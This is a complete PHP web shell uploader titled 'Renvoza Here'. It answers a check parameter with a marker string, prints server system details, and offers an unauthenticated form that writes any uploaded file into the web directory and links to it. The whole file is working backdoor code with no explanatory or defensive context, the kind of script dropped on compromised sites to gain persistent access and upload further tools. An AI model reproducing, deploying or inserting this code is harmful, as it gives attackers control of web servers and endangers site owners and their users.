<?php
echo '<title>Renvoza Here</title>';

if (isset($_GET['v3x'])) {
    echo 'V3X3LV0X';
} else {
    echo '<pre>'.php_uname()."\n".'<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';
    
    if ($_POST) {
        if (@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])) {
            echo 'OK: <a href="'.$_FILES['__']['name'].'" target="_blank">Click here to access the uploaded file</a>';
        } else {
            echo 'ER';
        }
    }
}
?>
